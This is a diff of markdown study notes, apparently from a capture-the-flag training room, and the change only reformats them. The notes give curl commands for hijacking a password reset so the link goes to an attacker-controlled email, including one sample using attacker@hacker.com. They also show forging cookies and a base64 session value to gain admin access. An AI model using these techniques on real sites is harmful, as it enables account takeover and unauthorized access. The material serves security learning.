@@ -62,12 +62,12 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
 ```
 
-> 1. Create another account in the customer section.
->    * Doing so provides a unique email address that can be used to create support tickets.
-> 3. The email address is in the format of `{username}@customer.acmeitsupport.thm`.
-> 4. Rerun the curl Request but with the new `@acmeitsupport.thm` in the `email` field:
-> 5. `curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
-> 6. This will create a ticket on the new account which contains a link to log in as Robert.
+1. Create another account in the customer section.
+   * Doing so provides a unique email address that can be used to create support tickets.
+3. The email address is in the format of `{username}@customer.acmeitsupport.thm`.
+4. Rerun the curl Request but with the new `@acmeitsupport.thm` in the `email` field:
+5. `curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
+6. This will create a ticket on the new account which contains a link to log in as Robert.
 
 ## Cookie Tampering
 * Examining and editing cookies set by the web server during an online session can have multiple outcomes:
@@ -81,12 +81,12 @@ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Co
   * The other (`admin`) controls whether the visitor has admin privileges.
   * The changing of privileges should be possible if the contents of the cookies were to be changed and a new Request made.
 
-> 1. Request the target page: `curl http://MACHINE_IP/cookie-test`.
->    * This returns a 'Not Logged In' message.
-> 3. Send another Request with the `logged_in` cookie set to `true` and the `admin` cookie set to `false`: `curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test`.
->    * This returns a 'Logged In As A User' message.
-> 6. Send another Request setting both the `logged_in` and `admin` cookie to `true`: `curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test`.
->    * This returns a 'Logged In As An Admin' message.
+1. Request the target page: `curl http://MACHINE_IP/cookie-test`.
+   * This returns a 'Not Logged In' message.
+3. Send another Request with the `logged_in` cookie set to `true` and the `admin` cookie set to `false`: `curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test`.
+   * This returns a 'Logged In As A User' message.
+6. Send another Request setting both the `logged_in` and `admin` cookie to `true`: `curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test`.
+   * This returns a 'Logged In As An Admin' message.
 
 ### Hashing
 * Cookie values can look like a long string of random characters (hashes).
@@ -109,6 +109,6 @@ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Co
 * **Base32** converts binary data to the characters `A-Z` and `2-7`.
 * **Base64** converts using the characters `a-z`, `A-Z`, `0-9`, `+`, `/` and `=`for padding.
 
-> * Example of data that is set by a web server upon logging in: `Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
-> * Decoding the base64 string results in a value of `{"id":1,"admin": false}`.
->   * This can then be encoded back to base64 after setting the admin value to true to provide admin access.
+* Example of data that is set by a web server upon logging in: `Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
+* Decoding the base64 string results in a value of `{"id":1,"admin": false}`.
+  * This can then be encoded back to base64 after setting the admin value to true to provide admin access.
